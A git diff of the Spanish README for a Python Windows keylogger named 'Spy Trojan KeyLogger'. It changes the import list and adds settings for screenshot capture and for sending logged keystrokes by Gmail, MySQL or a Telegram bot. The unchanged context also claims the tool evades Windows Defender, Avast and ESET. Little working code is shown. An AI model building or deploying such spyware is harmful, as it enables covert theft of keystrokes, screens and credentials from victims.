@@ -9,7 +9,7 @@
 # ¡Por favor! úserla solo para fines educativos y con profesionalidad...
 ## Información
 * __Nombre:__ `Spy Trojan KeyLogger`
-* __Documentación:__ `2/07/2020` 
+* __Documentación:__ `02/07/2020` 
 * __Versión:__ `5.3`
 * __Estado:__` Estable`
 * __Plataforma:__` Windows 7, 8.1 y 10`
@@ -21,21 +21,6 @@ __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general,
 # Carpeta Principal
 ![Archivos](https://i.imgur.com/F1i9X0j.png)
 
-* from eventlet.tpool import socket, threading  ` Librería verifica internet y permite procesos multihilos`
-* from pynput.keyboard import Listener
-* from getpass import getuser     # Obtiene el nombre del usuario
-* from datetime import datetime   # Devuelve fecha y hora actual
-* from winreg import OpenKey, SetValueEx, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, REG_SZ, HKEY_CURRENT_USER # Modifica registros de Windows
-* import datetime                 # Devuelve fecha y hora actual
-* import random                   # Genera numeros
-* import os                       # Lib para copiar archivos
-* import telepot                  # Telegram API
-* import yagmail                  # Enviar archivos solo a Gmail
-* import pymysql                  # Lib connection mysql
-* import shutil                   # Lib para crear carpetas
-* import string                   # Lib genera textos
-* import time                     # Contar segundos
-* from PIL import ImageGrab       # Toma capturas de pantall
 ---
 # Caracteristicas
 - __Indetectable Antivirus:__ Solo para: Windows Defender `02/07/2020`, Avast, ESET NOD32
@@ -103,21 +88,37 @@ El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución
 __NOTA:__ Como requisito mínimo para el aprendizaje de ésta herramienta es saber programar en __Python básico__ y en casó de que use la conexión a la base de datos, pues MySQL básico.
 
 Requerimiento de paquetes de `Python3.8`:
-- `import pynput`   <== Obtiene los eventos de teclado.
-- `from pynput.keyboard import Key, Listener` <== Escucha eventos del teclado
-- `from getpass import getuser`  <== Obtiene el nombre del Usuario
-- `import datetime` <== Obtiene la Fecha, Horas, Minutos, y segundos actual
-- `import os`       <== Operaciones con archivos
-- `from winreg import *` <== Permite escribir en el registro de windows.
-- `import telebot *` <== Permite Conectarse con Telegram
-- `import time`     <== Obtiene la Fecha, Horas, Minutos, y segundos actual.
-- `import yagmail`  <== Envía `reg.k` por Gmail
-- `import socket`   <== Verifica conexión a internet
-- `import pymysql`  <== Permite conectarnos a la base de datos
-- `import threading` <== Ejecución multihilos
-- `import pyinstaller` <== Convierte de `*.py` a `*.exe`
 
-NOTA: Biblioteca no optimizada! :'( 
+````py
+import socket		# Verifica internet
+import threading 	# procesos multihilos
+from pynput.keyboard import Listener            # Escucha eventos del teclado
+from getpass import getuser     # Obtiene el nombre del usuario
+from datetime import datetime   # Devuelve fecha y hora actual
+from winreg import OpenKey, SetValueEx, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, REG_SZ, HKEY_CURRENT_USER # Modifica registros de Windows
+import datetime                 # Devuelve fecha y hora actual
+import random                   # Genera numeros
+import os                       # Lib para copiar archivos
+import telepot                  # Telegram API
+import yagmail                  # Enviar archivos solo a Gmail
+import pymysql                  # Lib connection mysql
+import shutil                   # Lib para crear carpetas
+import string                   # Lib genera textos
+import time                     # Contar segundos
+from PIL import ImageGrab       # Toma capturas de pantalla
+````
+
+
+## ScreenShot [Solo Telegram]
+    ````py
+    self.SCREENSHOT = True                                  # Activar o desactivar Screenshot
+    self.TIME_SCREENSHOT = 2                                # Tiempo de intervalo de ScreenShot
+    self.DELAY  = 10                                                            # tiempo de retraso para evitar sobrecargos al iniciar
+    self.TIME_SEND = 1 #[minutos]                                               # Tiempo de envió del registro
+    self.MODE_SEND = 2     # 0 = Gmail
+                           # 1 = DataBase                                           # Solo se puede usar una opción
+                           # 2 = TelegramBot
+    ````
 
 ## Escoge [GMAIL], [DataBase] o [Telegram]:
 - Por ahora solo podemos escoger el envío del registro o bien por una conexión a una __Base de datos__,  __Gmail__  o __BotTelegram__ no podemos escoger dos o las tres al mismo tiempo.
@@ -125,10 +126,10 @@ NOTA: Biblioteca no optimizada! :'(
 - Buscamos la siguiente función y escogemos [0 = Gmail], [1 = DataBase] o  [2 = BotTelegram]
     ````py
     # Importante
-        self.TIMESEND = 5 #[minutos]                                                # Tiempo de envió del registro
-        self.MODE = 0     # 0 = Gmail
-                          # 1 = DataBase                                            # Solo se puede usar una opción
-                          # 2 = TelegramBot
+    self.TIMESEND = 5 #[minutos]                                                # Tiempo de envió del registro
+    self.MODE = 0   # 0 = Gmail
+                    # 1 = DataBase                                            # Solo se puede usar una opción
+                    # 2 = TelegramBot
     ```` 
 
 
@@ -328,7 +329,7 @@ __Explicación:__
 ## By SebastianEPH
 __Nota:__ Contacteme solo si encontró un bug o desea aportar al repositorio, gracias.
 
-<!--- [Website](https://sebastianeph.github.io/) -->
+- [Website](https://sebastianeph.github.io/)
 - [Github](https://github.com/SebastianEPH)
 <!--- - [Telegram](https://t.me/sebastianeph) -->
 - [Facebook](https://www.facebook.com/SebastianEPH)
